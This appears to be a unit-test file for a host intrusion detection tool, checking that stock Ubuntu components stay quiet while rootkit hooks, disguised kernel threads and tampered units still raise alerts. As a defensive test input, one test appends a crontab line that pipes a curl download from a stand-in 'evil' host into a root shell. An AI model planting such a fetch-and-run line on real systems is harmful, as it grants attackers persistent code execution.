"""Noise found by installing the server edition on a stock Ubuntu 24.04 guest
(2026-10-25, ARGUS-SERVER.md W12). Each case keeps the real signal: the stock
system goes quiet, the threat in the same place still fires."""
import os
import tempfile
import unittest
from unittest import mock

from jarvis.collectors.persistence import control
from jarvis.collectors.process import detect
from jarvis.collectors.process.hidden import kernel
from jarvis.service import jobs, selfcheck


class FtraceTests(unittest.TestCase):
    TEXT = ("__hid_bpf_tail_call (1)    R   D   \ttramp: ftrace_regs_caller+0x0/0x65 (call_direct_funcs+0x0/0x20)\n"
            "\tdirect-->bpf_trampoline_6442495097+0x0/0xf1\n"
            "tcp_v4_connect (1)  R  D  \ttramp: ftrace_regs_caller (call_direct_funcs)\n"
            "\tdirect-->bpf_trampoline_123+0x0/0xf1\n"
            "__x64_sys_getdents64 (1)  R   \ttramp: 0xffffffffc0a01000 (fh_ftrace_thunk+0x0/0x50 [diamorphine])\n")

    def test_continuation_lines_are_not_counted_as_functions(self):
        names = [f for f, _ in kernel.ftrace_hook_records(self.TEXT)]
        self.assertEqual(names, ["__hid_bpf_tail_call", "tcp_v4_connect", "__x64_sys_getdents64"])

    def test_kernel_hid_bpf_bpf_and_rootkit_hooks_are_told_apart(self):
        kinds = dict(kernel.ftrace_hook_records(self.TEXT))
        self.assertEqual(kinds, {"__hid_bpf_tail_call": "kernel_bpf", "tcp_v4_connect": "bpf",
                                 "__x64_sys_getdents64": "ftrace"})

    def test_an_ftrace_callback_on_a_hid_name_is_still_ftrace(self):
        # The allowance is for the BPF attachment, never for the name alone.
        kinds = dict(kernel.ftrace_hook_records("__hid_bpf_tail_call (1) R \ttramp: 0xffff (evil_cb [rk])\n"))
        self.assertEqual(kinds["__hid_bpf_tail_call"], "ftrace")


class KernelThreadTests(unittest.TestCase):
    KWORKER = {"fp": "k", "host": "wsl", "pid": 154, "ppid": 2, "exe": "", "user": "root", "conns": [],
               "name": "kworker/u2:5-events_freezable_power_", "cmdline": "[kworker/u2:5-events_freezable_power_]"}

    def test_a_renamed_kworker_is_not_a_new_binary(self):
        v = detect.assess(self.KWORKER, known=set(), approved=set())
        self.assertEqual((v["unknown"], v["severity"]), (False, "low"))

    def test_userspace_disguised_as_a_kernel_thread_still_scores(self):
        fake = dict(self.KWORKER, ppid=1, exe="/dev/shm/kworker", cmdline="[kworker/0:1]")
        self.assertIn(detect.assess(fake, known=set(), approved=set())["severity"], ("high", "critical"))


class FeedAggregationTests(unittest.TestCase):
    def test_one_cause_is_one_finding_naming_the_feeds(self):
        results = [{"name": n, "error": "<urlopen error [Errno -3] Temporary failure in name resolution>"}
                   for n in ("threatfox", "urlhaus", "cisa-kev")] + [{"name": "bazaar-full", "error": "HTTP Error 410: Gone"}]
        store = mock.MagicMock()
        with mock.patch.object(jobs, "_store") as ctx, \
                mock.patch.object(jobs.feeds, "refresh", return_value=results[:]), \
                mock.patch.object(jobs.feeds, "refresh_attack", return_value={"name": "attack", "kept": 0}), \
                mock.patch.object(jobs.feeds, "refresh_tranco", return_value={"name": "tranco", "kept": 0}), \
                mock.patch.object(jobs.feeds, "prune"), mock.patch.object(jobs.retention, "apply", return_value=[]):
            ctx.return_value.__enter__.return_value = store
            out = jobs._feeds(("wsl",), ":memory:")
        titles = [f["title"] for f in out if f["severity"] == "medium"]
        self.assertEqual(titles, ["3 threat feeds failed", "bazaar-full feed failed"])
        self.assertIn("cisa-kev, threatfox, urlhaus", out[0]["detail"])


class SupervisionTests(unittest.TestCase):
    def test_systemd_watchdog_with_restart_always_is_supervision(self):
        with mock.patch.object(selfcheck, "timer_state", return_value=("", "")), \
                mock.patch.object(selfcheck, "systemd_supervision", return_value=(900, "always")), \
                mock.patch.object(jobs.alert, "channel_findings", return_value=[]), \
                mock.patch.object(jobs, "_link_findings", return_value=[]), \
                mock.patch.object(jobs.host, "has_windows", return_value=False), \
                mock.patch.object(jobs.host, "native_windows", return_value=False):
            [f] = jobs._watchdogs((), ":memory:")
        self.assertEqual((f["severity"], f["title"]), ("ok", "systemd supervises this daemon"))

    def test_no_timer_and_no_watchdog_is_still_high(self):
        for supervision in ((0, "always"), (900, "on-failure"), (0, "")):
            with mock.patch.object(selfcheck, "timer_state", return_value=("", "")), \
                    mock.patch.object(selfcheck, "systemd_supervision", return_value=supervision), \
                    mock.patch.object(jobs.alert, "channel_findings", return_value=[]), \
                    mock.patch.object(jobs, "_link_findings", return_value=[]), \
                    mock.patch.object(jobs.host, "has_windows", return_value=False), \
                    mock.patch.object(jobs.host, "native_windows", return_value=False):
                [f] = jobs._watchdogs((), ":memory:")
            self.assertEqual(f["severity"], "high", supervision)

    def test_span_parsing(self):
        self.assertEqual([selfcheck._span_seconds(s) for s in ("15min", "1h 30s", "infinity", "")], [900, 3630, 0, 0])


class PackagedInventoryTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.etc, self.usr = os.path.join(self.tmp, "etc"), os.path.join(self.tmp, "usr")
        os.makedirs(self.etc)
        os.makedirs(self.usr)
        for name in ("apt-daily.timer", "evil.service"):
            open(os.path.join(self.usr if name == "apt-daily.timer" else self.etc, name), "w").close()
        with open(os.path.join(self.etc, "snap-core-1.mount"), "w") as fh:
            fh.write("[Mount]\nWhat=/var/lib/snapd/snaps/core_1.snap\nWhere=/snap/core/1\n")
        with open(os.path.join(self.etc, "snap-evil-1.mount"), "w") as fh:
            fh.write("[Mount]\nWhat=/dev/sdb1\n")

    def tearDown(self):
        import shutil
        shutil.rmtree(self.tmp)

    def test_only_package_or_snapd_owned_units_are_summarised(self):
        apt = os.path.realpath(os.path.join(self.usr, "apt-daily.timer"))

        def run(argv):
            if argv[0] == "dpkg":
                return f"apt: {apt}\n" if apt in argv else ""
            return ""
        units = ["apt-daily.timer", "evil.service", "snap-core-1.mount", "snap-evil-1.mount"]
        with mock.patch.object(control, "UNIT_LOAD_PATH", (self.etc, self.usr)), \
                mock.patch.object(control, "package_manager", return_value="dpkg"):
            owned = control.packaged_units(units, run=run)
        self.assertEqual(owned, {"apt-daily.timer", "snap-core-1.mount"})

    def test_unknown_package_manager_owns_nothing(self):
        with mock.patch.object(control, "package_manager", return_value=""):
            self.assertEqual(control.packaged_units(["apt-daily.timer"], run=lambda a: "x"), set())

    def test_cron_file_counts_as_stock_only_when_byte_identical(self):
        path = os.path.join(self.etc, "crontab")
        with open(path, "w") as fh:
            fh.write("17 * * * * root run-parts /etc/cron.hourly\n")
        import hashlib
        with open(path, "rb") as fh:
            md5 = hashlib.md5(fh.read(), usedforsecurity=False).hexdigest()

        def run(argv):
            if argv[:2] == ["dpkg", "-S"]:
                return f"cron: {path}\n"
            if argv[0] == "dpkg-query":
                return f" {path} {md5}\n"
            return ""
        with mock.patch.object(control, "package_manager", return_value="dpkg"):
            self.assertTrue(control.unchanged_package_file(path, run=run))
            with open(path, "a") as fh:
                fh.write("* * * * * root curl evil | sh\n")
            self.assertFalse(control.unchanged_package_file(path, run=run))


if __name__ == "__main__":
    unittest.main()


class HostKindOverrideTests(unittest.TestCase):
    """A server-edition install inside WSL can watch only the Linux guest (2026-10-25)."""

    WSL = "6.6.87.2-microsoft-standard-WSL2"

    def test_override_only_narrows_wsl_to_linux(self):
        from jarvis.platform import host
        self.assertEqual(host._detect("posix", self.WSL, override="linux"), "linux")
        self.assertEqual(host._detect("posix", self.WSL, override=""), "wsl")
        self.assertEqual(host._detect("posix", "6.8.0-45-generic", override="wsl"), "linux")
        self.assertEqual(host._detect("posix", "6.8.0-45-generic", override="windows"), "linux")
        self.assertEqual(host._detect("nt", "", override="linux"), "windows")

    def test_override_file_must_be_root_owned_and_not_writable_by_others(self):
        from jarvis.platform import host
        with tempfile.TemporaryDirectory() as d:
            path = os.path.join(d, "host-kind")
            with open(path, "w") as fh:
                fh.write("linux\n")
            os.chmod(path, 0o644)
            st = os.stat(path)
            expected = "linux" if st.st_uid == 0 else ""
            self.assertEqual(host._override(path), expected)
            fake = os.stat_result((0o100666, 0, 0, 1, 0, 0, 6, 0, 0, 0))
            with mock.patch.object(host.os, "stat", return_value=fake):
                self.assertEqual(host._override(path), "", "world-writable is ignored")
            fake_root = os.stat_result((0o100644, 0, 0, 1, 0, 0, 6, 0, 0, 0))
            with mock.patch.object(host.os, "stat", return_value=fake_root):
                self.assertEqual(host._override(path), "linux")
        self.assertEqual(host._override(os.path.join(d, "missing")), "")
